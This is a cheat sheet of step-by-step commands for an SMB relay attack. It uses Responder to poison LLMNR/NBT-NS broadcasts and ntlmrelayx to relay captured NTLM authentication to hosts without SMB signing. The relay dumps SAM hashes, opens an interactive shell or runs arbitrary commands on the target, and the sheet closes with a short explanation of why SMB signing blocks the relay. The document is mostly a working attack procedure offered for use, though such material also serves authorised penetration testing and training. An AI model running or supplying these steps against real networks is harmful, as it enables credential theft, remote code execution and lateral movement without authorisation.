SMB Relay Attack - Cheat Sheet

Instead of cracking a captured NTLM hash, relay it in real-time to authenticate
as the victim on another machine in the network.
Replace the placeholders (<...>) with your own values.


Step 1 - Verify the target does NOT enforce SMB signing

SMB signing must be disabled (or not required) on the target for the relay to work.

    nmap --script smb2-security-mode -p 445 <target-subnet>/<cidr>

Look for:
    Message signing enabled but not required   ← vulnerable
    Message signing enabled and required       ← not vulnerable, skip this host


Step 2 - Disable SMB and HTTP in Responder

Responder will capture the hash but NOT serve it - ntlmrelayx does the relay.
Edit the Responder config:

    sudo nano /etc/responder/Responder.conf

Set:
    SMB = Off
    HTTP = Off


Step 3 - Build a target list

Put every IP that has signing disabled into a file, one per line:

    echo "<target-ip>" >> targets.txt


Step 4 - Start ntlmrelayx

Option A - Dump SAM hashes from targets (default):

    sudo ntlmrelayx.py -tf targets.txt -smb2support

Option B - Drop into an interactive shell on the target:

    sudo ntlmrelayx.py -tf targets.txt -smb2support -i

Option C - Execute a command on the target:

    sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"


Step 5 - Start Responder (with SMB/HTTP off)

    sudo responder -I <interface> -rdw

Wait for a victim to send an LLMNR/NBT-NS broadcast (e.g. mistyped share name).
Responder poisons the broadcast; ntlmrelayx catches the auth and relays it.


Step 6 - Collect results

Option A (SAM dump): ntlmrelayx prints local account hashes directly in the terminal.
Option B (interactive shell): connect to the local listener ntlmrelayx opened:

    nc 127.0.0.1 11000

You now have an SMB shell on the target as the relayed user.


Step 7 - Stop cleanly

Press Ctrl+C in both the Responder and ntlmrelayx terminals.
Responder does not modify ARP tables, so no network cleanup is needed.


(optional) Restore Kali's networking

Only needed if you manually set a static IP before the attack:

    sudo nmcli con mod "<connection name>" ipv4.method auto
    sudo nmcli con up "<connection name>"


Key idea: instead of cracking the hash, you forward the victim's NTLM auth challenge
to a second machine on the network. If that machine trusts the user whose hash you
relayed, you get access without ever knowing the plaintext password. SMB signing
would cryptographically bind the auth to the original session, blocking the relay -
that's why signing status matters.
